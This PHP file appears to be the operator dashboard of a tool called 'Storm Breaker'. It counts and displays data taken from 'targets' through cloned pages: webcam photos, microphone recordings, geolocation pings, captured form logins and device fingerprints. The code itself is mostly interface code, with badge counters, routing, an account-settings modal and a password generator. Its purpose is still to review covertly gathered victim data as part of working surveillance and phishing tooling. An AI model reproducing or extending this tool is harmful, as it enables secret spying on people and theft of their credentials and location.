<?php
// panel.php — main authenticated UI. Renders the dashboard or any of the
// sidebar routes (home / targets / captures / audio / geo).

require_once __DIR__ . '/auth.php';
require_once __DIR__ . '/lib/store.php';
auth_boot();
auth_require();

// Routing — sidebar links pass ?route=...
$route = $_GET['route'] ?? 'home';
$active_route = $route;

$pages = [
    'home'        => ['title' => 'Dashboard',   'sub' => '// overview · live status'],
    'targets'     => ['title' => 'Targets',     'sub' => '// hosts under engagement'],
    'captures'    => ['title' => 'Captures',    'sub' => '// webcam photo gallery'],
    'audio'       => ['title' => 'Audio',       'sub' => '// microphone recordings'],
    'geo'         => ['title' => 'Geo Data',    'sub' => '// captured geolocation pings'],
    'credentials' => ['title' => 'Credentials', 'sub' => '// captured form logins'],
    'devices'     => ['title' => 'Devices',     'sub' => '// browser & device fingerprints'],
];
$page = $pages[$route] ?? $pages['home'];

// Badge system: count new items per route since last visit.
$db = store_open();
$badge_map = [
    'captures'    => "SELECT COUNT(*) FROM media WHERE kind='camera' AND captured_at > :since",
    'audio'       => "SELECT COUNT(*) FROM media WHERE kind='mic' AND captured_at > :since",
    'geo'         => "SELECT COUNT(*) FROM events WHERE kind='geo' AND captured_at > :since",
    'credentials' => "SELECT COUNT(*) FROM events WHERE kind='cred' AND captured_at > :since",
    'targets'     => "SELECT COUNT(*) FROM targets WHERE created_at > :since",
    'devices'     => "SELECT COUNT(*) FROM events WHERE kind='device' AND captured_at > :since",
];
$sidebar_badges = [];
foreach ($badge_map as $rkey => $sql) {
    $seen_ts = store_kv_get('sidebar_seen_' . $rkey);
    $since   = $seen_ts !== null ? (int) $seen_ts : time();
    if ($seen_ts === null) store_kv_set('sidebar_seen_' . $rkey, (string) time());
    $st = $db->prepare($sql);
    $st->execute([':since' => $since]);
    $cnt = (int) $st->fetchColumn();
    if ($cnt > 0) $sidebar_badges[$rkey] = $cnt;
}

// Mark current route as seen.
if ($route !== 'home' && isset($badge_map[$route])) {
    store_kv_set('sidebar_seen_' . $route, (string) time());
    unset($sidebar_badges[$route]);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Storm Breaker — <?= htmlspecialchars($page['title']) ?></title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./assets/css/cypher-ui.css">
</head>
<body class="panel-shell">

<?php include "./assets/components/icons.php"; ?>
<?php include "./assets/components/header.php"; ?>

<main>
  <?php include "./assets/components/sidebar.php"; ?>

  <div class="panel-content">
    <h1 class="panel-page-title"><?= htmlspecialchars($page['title']) ?></h1>
    <p class="panel-page-sub"><?= htmlspecialchars($page['sub']) ?></p>

    <?php if ($route === 'home'):
      $db = store_open();
      $dash_captures = (int) $db->query("SELECT COUNT(*) FROM media WHERE kind='camera'")->fetchColumn();
      $dash_audio    = (int) $db->query("SELECT COUNT(*) FROM media WHERE kind='mic'")->fetchColumn();
      $dash_geo      = (int) $db->query("SELECT COUNT(*) FROM events WHERE kind='geo'")->fetchColumn();
      $dash_targets  = (int) $db->query("SELECT COUNT(*) FROM targets")->fetchColumn();
    ?>
      <div class="stat-grid">
        <div class="stat-card">
          <div class="stat-label">Captures</div>
          <div class="stat-value cyan"><?= $dash_captures ?></div>
          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_captures ? 'camera frames' : 'awaiting data' ?></div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Audio</div>
          <div class="stat-value"><?= $dash_audio ?></div>
          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_audio ? 'mic clips' : 'awaiting data' ?></div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Geo Pings</div>
          <div class="stat-value"><?= $dash_geo ?></div>
          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_geo ? 'location pings' : 'awaiting data' ?></div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Targets</div>
          <div class="stat-value green"><?= $dash_targets ?></div>
          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_targets ? 'active clones' : 'awaiting data' ?></div>
        </div>
      </div>

      <?php if ($dash_targets === 0): ?>
      <div class="alert alert-info">
        <div class="alert-icon"><svg class="icon icon-md"><use href="#i-info"/></svg></div>
        <div class="alert-content">
          <div class="alert-title">PANEL READY</div>
          <div class="alert-body">Use the sidebar to navigate. Capture views, audio, and geo data will populate as targets engage.</div>
        </div>
      </div>
      <?php endif; ?>
    <?php elseif ($route === 'targets'): ?>
      <?php include "./assets/components/route-targets.php"; ?>
    <?php elseif ($route === 'captures'): ?>
      <?php include "./assets/components/route-captures.php"; ?>
    <?php elseif ($route === 'audio'): ?>
      <?php include "./assets/components/route-audio.php"; ?>
    <?php elseif ($route === 'geo'): ?>
      <?php include "./assets/components/route-geo.php"; ?>
    <?php elseif ($route === 'credentials'): ?>
      <?php include "./assets/components/route-credentials.php"; ?>
    <?php elseif ($route === 'devices'): ?>
      <?php include "./assets/components/route-devices.php"; ?>
    <?php else: ?>
      <div class="alert alert-info">
        <div class="alert-icon"><svg class="icon icon-md"><use href="#i-info"/></svg></div>
        <div class="alert-content">
          <div class="alert-title">UNKNOWN ROUTE</div>
          <div class="alert-body">No view registered for this route.</div>
        </div>
      </div>
    <?php endif; ?>
  </div>
</main>

<!-- ── ACCOUNT SETTINGS MODAL ─────────────────────────── -->
<?php $current_user = auth_user() ?? 'admin'; ?>
<div class="modal-scrim" id="modal-settings" onclick="handleScrimClick(event,'modal-settings')">
  <div class="modal modal-md" onclick="event.stopPropagation()">
    <form id="settings-form" onsubmit="saveSettings(event)" autocomplete="off">
      <div class="modal-header">
        <div class="modal-header-left">
          <div class="modal-icon modal-icon-cyan"><svg class="icon icon-md"><use href="#i-settings"/></svg></div>
          <div>
            <div class="modal-title">ACCOUNT SETTINGS</div>
            <div class="modal-subtitle">// change username & password</div>
          </div>
        </div>
        <button type="button" class="modal-x" onclick="closeModal('modal-settings')"><svg class="icon icon-sm"><use href="#i-x"/></svg></button>
      </div>

      <div class="modal-body">
        <div class="form-group">
          <label class="form-label" for="settings-username">Username</label>
          <input id="settings-username" name="username" class="form-input" type="text"
                 minlength="3" maxlength="32" pattern="[A-Za-z0-9_-]+"
                 required autocomplete="username"
                 value="<?= htmlspecialchars($current_user) ?>">
          <span class="form-hint">// 3–32 characters · letters, digits, “_” or “-”</span>
        </div>

        <div class="form-group">
          <label class="form-label" for="settings-password">New password</label>
          <div style="display:flex;gap:var(--space-2);align-items:stretch">
            <input id="settings-password" name="password" class="form-input" type="password"
                   minlength="8" required autocomplete="new-password" placeholder="••••••••"
                   style="flex:1;font-family:var(--font-mono)">
            <button type="button" class="btn btn-outline btn-sm" onclick="togglePasswordVisibility()" title="Show/hide" aria-label="Show or hide password">
              <svg class="icon icon-sm" id="settings-eye"><use href="#i-eye"/></svg>
            </button>
            <button type="button" class="btn btn-outline btn-sm" onclick="generatePassword()" title="Generate secure password">
              <svg class="icon icon-sm"><use href="#i-zap"/></svg>
              Generate
            </button>
          </div>
          <span class="form-hint">// minimum 8 chars · click <strong style="color:var(--accent-primary)">Generate</strong> for a 20-char secure password, or use your browser’s suggestion</span>
        </div>

        <div class="login-error" id="settings-error" style="display:none">
          <svg class="icon icon-sm"><use href="#i-alert-octagon"/></svg>
          <span id="settings-error-msg"></span>
        </div>
      </div>

      <div class="modal-footer">
        <button type="button" class="btn btn-ghost btn-sm" onclick="closeModal('modal-settings')">Cancel</button>
        <button type="submit" class="btn btn-primary btn-sm" id="settings-save">
          <svg class="icon icon-sm"><use href="#i-save"/></svg>
          Save changes
        </button>
      </div>
    </form>
  </div>
</div>

<!-- ── TOAST CONTAINER ─────────────────────────────────── -->
<div class="toast-container" id="toastContainer"></div>

<script>
/* Sidebar drawer (mobile) */
function toggleSidebar() {
  document.getElementById('panelSidebar').classList.toggle('open');
  document.getElementById('panelSidebarScrim').classList.toggle('open');
}

/* Modal helpers */
function openModal(id) {
  const el = document.getElementById(id);
  if (!el) return;
  el.classList.add('open');
  document.body.style.overflow = 'hidden';
}
function closeModal(id) {
  const el = document.getElementById(id);
  if (!el) return;
  el.classList.remove('open');
  document.body.style.overflow = '';
}
function handleScrimClick(e, id) {
  if (e.target === document.getElementById(id)) closeModal(id);
}
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') {
    document.querySelectorAll('.modal-scrim.open').forEach(m => {
      m.classList.remove('open');
      document.body.style.overflow = '';
    });
  }
});

/* Password generator — secure (Web Crypto) */
function generatePassword(len = 20) {
  // Mix of upper, lower, digits, and a small set of symbols.
  const charset = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789!@#$%&*-_=+';
  const arr = new Uint32Array(len);
  crypto.getRandomValues(arr);
  let pw = '';
  for (let i = 0; i < len; i++) pw += charset[arr[i] % charset.length];

  const input = document.getElementById('settings-password');
  input.value = pw;
  input.type = 'text';
  document.getElementById('settings-eye').querySelector('use').setAttribute('href', '#i-eye-off');
}

function togglePasswordVisibility() {
  const input = document.getElementById('settings-password');
  const eye = document.getElementById('settings-eye').querySelector('use');
  if (input.type === 'password') {
    input.type = 'text';
    eye.setAttribute('href', '#i-eye-off');
  } else {
    input.type = 'password';
    eye.setAttribute('href', '#i-eye');
  }
}

/* Toast (compact, just for save feedback) */
let toastCount = 0;
function fireToast(type, title, msg) {
  const id = 'toast-' + (++toastCount);
  const cls = {success:'toast-success', error:'toast-error', info:'toast-info'}[type] || 'toast-info';
  const ico = {success:'#i-check', error:'#i-alert-octagon', info:'#i-info'}[type] || '#i-info';
  const now = new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
  const el = document.createElement('div');
  el.className = 'toast ' + cls;
  el.id = id;
  el.innerHTML = `
    <div class="toast-icon"><svg class="icon icon-sm"><use href="${ico}"/></svg></div>
    <div class="toast-body">
      <div class="toast-title">${title}</div>
      <div class="toast-msg">${msg}</div>
      <div class="toast-time">${now}</div>
    </div>
    <button class="toast-close" onclick="dismissToast('${id}')"><svg class="icon icon-sm"><use href="#i-x"/></svg></button>`;
  document.getElementById('toastContainer').appendChild(el);
  setTimeout(() => dismissToast(id), 5000);
}
function dismissToast(id) {
  const el = document.getElementById(id);
  if (!el) return;
  el.classList.add('removing');
  el.addEventListener('animationend', () => el.remove(), { once: true });
}

/* Save settings (POST → settings.php) */
async function saveSettings(e) {
  e.preventDefault();
  const form = e.target;
  const btn = document.getElementById('settings-save');
  const err = document.getElementById('settings-error');
  const errMsg = document.getElementById('settings-error-msg');
  err.style.display = 'none';
  btn.disabled = true;

  try {
    const res = await fetch('settings.php', { method: 'POST', body: new FormData(form) });
    const json = await res.json();
    if (!res.ok || !json.ok) {
      errMsg.textContent = json.error || 'Could not save changes.';
      err.style.display = '';
      return;
    }
    closeModal('modal-settings');
    fireToast('success', 'CREDENTIALS UPDATED', 'Signed in as ' + json.username + '. Reloading…');
    setTimeout(() => location.reload(), 900);
  } catch (e) {
    errMsg.textContent = 'Network error: ' + e.message;
    err.style.display = '';
  } finally {
    btn.disabled = false;
  }
}
</script>

</body>
</html>
